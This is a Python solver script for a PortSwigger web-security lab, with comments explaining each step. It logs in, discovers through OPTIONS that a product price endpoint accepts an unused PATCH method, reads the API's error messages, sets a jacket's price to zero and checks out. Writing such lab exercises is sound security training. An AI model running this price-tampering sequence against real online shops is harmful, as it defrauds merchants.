# Lab 02 — Finding and exploiting an unused API endpoint
# PortSwigger: https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint
#
# Vulnerability: A pricing endpoint supports PATCH, fully functional, even
#                though the front-end only ever calls it with GET
# Aim:           Buy the "Lightweight l33t Leather Jacket" by setting its
#                price to $0.00
#
# Technique:
#   GET  /api/products/{id}/price        → shows current price
#   OPTIONS same URL                     → Allow: GET, PATCH  (PATCH unused by UI!)
#   PATCH with no Content-Type/body      → error about Content-Type
#   PATCH with Content-Type + empty body → error about missing 'price'
#   PATCH with {"price": 0}              → 200 OK, price now $0.00
#
#   Each error message tells you exactly what to fix next — a great example
#   of using API error responses as a recon roadmap.
#
# Usage: python api_testing_lab02.py <url>

import sys
import urllib3
from proxies import proxies
from api_testing_utils import banner, section, make_session, login, check_status, find_product_id, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 02 — FINDING AND EXPLOITING AN UNUSED API ENDPOINT")

    if len(sys.argv) != 2:
        print("  Usage: python api_testing_lab02.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: find the leather jacket's product ID ─────────────────────────
    print("\n  ── Step 1: locate the Lightweight l33t Leather Jacket product ID\n")
    product_id = find_product_id(session, url)
    price_url = f"{url}/api/products/{product_id}/price"

    # ── Step 2: check current price ───────────────────────────────────────────
    print(f"\n  ── Step 2: GET {price_url}\n")
    r_get = session.get(price_url)
    check_status(r_get, 200, "GET product price")
    print_box("Current price", r_get.text)

    # ── Step 3: OPTIONS to discover supported methods ────────────────────────
    print("  ── Step 3: OPTIONS to discover supported HTTP methods\n")
    r_options = session.options(price_url)
    allow_header = r_options.headers.get("Allow", "")
    print(f"  ℹ  Allow header: {allow_header}")

    if "PATCH" not in allow_header:
        print("  ?  PATCH not listed — the lab instance may differ, trying anyway")

    # ── Step 4: PATCH with no Content-Type/body — expect a helpful error ────
    print("\n  ── Step 4: PATCH with no Content-Type/body\n")
    r_patch1 = session.patch(price_url)
    print(f"  ℹ  Status: {r_patch1.status_code}")
    print_box("Error response", r_patch1.text)

    # ── Step 5: PATCH with Content-Type + empty body ─────────────────────────
    print("  ── Step 5: PATCH with Content-Type: application/json and body {}\n")
    r_patch2 = session.patch(price_url, json={})
    print(f"  ℹ  Status: {r_patch2.status_code}")
    print_box("Error response", r_patch2.text)

    # ── Step 6: PATCH with the actual price payload ──────────────────────────
    print("  ── Step 6: PATCH with {\"price\": 0}\n")
    r_patch3 = session.patch(price_url, json={"price": 0})
    check_status(r_patch3, 200, "PATCH price to 0")
    print_box("Final price response", r_patch3.text)

    # ── Step 7: add to cart and place the order ───────────────────────────────
    print("  ── Step 7: add to cart and place the order\n")
    r_cart = session.post(f"{url}/cart", data={"productId": product_id, "quantity": "1"})
    check_status(r_cart, [200, 302], "Add to cart")

    r_checkout = session.post(f"{url}/cart/checkout")
    check_status(r_checkout, [200, 302], "Checkout")

    print()
    print("  ℹ  PATCH was never used by the UI, but the server accepted it anyway.")
    print("     Always OPTIONS an endpoint — don't assume the UI shows every method.")
